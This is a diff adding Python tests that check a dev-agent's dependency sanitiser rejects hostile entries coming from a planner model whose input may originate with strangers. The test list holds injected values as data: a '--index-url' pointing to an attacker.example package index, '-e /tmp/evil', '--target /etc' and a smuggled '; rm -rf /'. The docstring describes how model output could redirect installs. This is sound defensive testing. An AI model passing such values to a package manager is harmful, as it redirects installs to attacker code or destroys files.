@@ -170,6 +170,32 @@ def test_new_project_dir_falls_back_to_job_id_with_no_project_name():
         assert d.name == "da_abc123def456"
 
 
+
+def test_dependency_flags_are_refused():
+    """SECURITY: `dependencies` comes from the planner model, whose input can
+    originate with a stranger on Discord. pip/npm read a leading dash as a
+    FLAG, so --index-url would redirect the install to someone else's index
+    without needing a shell at all."""
+    from jarvis.actions.dev_agent import _safe_dependencies
+    kept, rejected = _safe_dependencies([
+        "requests", "flask==2.0.1", "uvicorn[standard]", "pydantic>=2",
+        "--index-url", "http://attacker.example/simple", "-e /tmp/evil",
+        "--target", "/etc", "; rm -rf /", "",
+    ])
+    assert kept == ["requests", "flask==2.0.1", "uvicorn[standard]", "pydantic>=2"], kept
+    for bad in ("--index-url", "-e /tmp/evil", "--target", "; rm -rf /"):
+        assert bad in rejected, (bad, rejected)
+
+
+def test_install_refuses_outright_rather_than_installing_a_subset():
+    """Silently dropping the bad entries would install a partial dependency
+    set and then fail confusingly at run time."""
+    from jarvis.actions import dev_agent
+    ok, out = dev_agent._install_dependencies(
+        Path("/tmp"), ["requests", "--index-url"], {"language": "python"})
+    assert ok is False
+    assert "not package names" in out["stderr_tail"], out
+
 if __name__ == "__main__":
     tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
     try:
